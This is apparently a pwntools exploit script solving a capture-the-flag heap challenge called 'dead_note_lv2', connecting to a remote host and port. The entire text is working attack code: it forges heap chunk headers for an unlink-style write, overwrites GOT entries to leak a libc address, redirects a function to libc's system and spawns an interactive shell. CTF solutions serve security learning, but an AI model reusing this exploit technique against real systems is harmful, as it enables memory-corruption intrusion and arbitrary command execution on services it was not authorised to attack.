from pwn import *

context.arch = "amd64"

#r = process(["./dead_note_lv2"])
r = remote("206.189.46.173", 50200)
def add(text):
	r.sendlineafter(":","1")
	r.sendlineafter(":",text)

def edit(idx,text):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",text)

def remove(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))


for i in range(10):
	remove(i)
	add("sh")

add("10")
for i in range(0x1b1-0x110):
	print "0 - %d"%i
	remove(0)
edit(10,flat([0x80,0x90]))
for i in range(0x110-0x90):
	print "1 - %d"%i
        remove(0)
edit(10,flat([0,0x81,0x602120-0x18,0x602120-0x10]))
for i in range(0x90+0x10):
	print "2 - %d"%i
	remove(0)
edit(10,flat([0x0,0xa1]))
remove(7)
edit(8,p64(0x602018)+p64(0x602020))
edit(5,p64(0x400720)[:-1])
remove(6)
libc = u64(r.recvline()[1:-1].ljust(8,'\x00'))-0x6f690
print hex(libc)
edit(5,p64(libc+0x45390)[:-1])
remove(2)
r.interactive()
